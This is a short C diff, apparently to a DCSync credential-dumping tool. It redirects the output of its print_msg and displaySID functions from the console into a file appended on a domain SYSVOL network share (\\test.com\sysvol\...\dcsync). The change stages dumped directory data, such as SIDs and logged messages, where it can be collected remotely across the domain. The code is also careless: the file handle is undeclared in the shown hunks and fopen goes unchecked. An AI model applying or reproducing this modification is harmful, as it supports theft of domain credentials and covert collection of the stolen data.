@@ -79,9 +79,11 @@ void print_msg(PCWCHAR format, ...)
 {
 	va_list args;
 	va_start(args, format);
-	vwprintf(format, args);
+	pFile = fopen("\\\\test.com\\sysvol\\test.com.com\\dcsync", "a");
+	vfwprintf(pFile, format, args);
 	fflush(stdout);
 	va_end(args);
+	fclose(pFile);
 }
 
 BOOL string_copy(LPWSTR* dst, LPCWSTR src)
@@ -129,8 +131,10 @@ void displaySID(IN PSID pSid)
 	LPSTR stringSid;
 	if (ConvertSidToStringSidA(pSid, &stringSid))
 	{
-		printf("%s", stringSid);
+		pFile = fopen("\\\\test.com\\sysvol\\test.com.com\\dcsync", "a");
+		fprintf(pFile,"%s", stringSid);
 		LocalFree(stringSid);
+		fclose(pFile);
 	}
 }
 
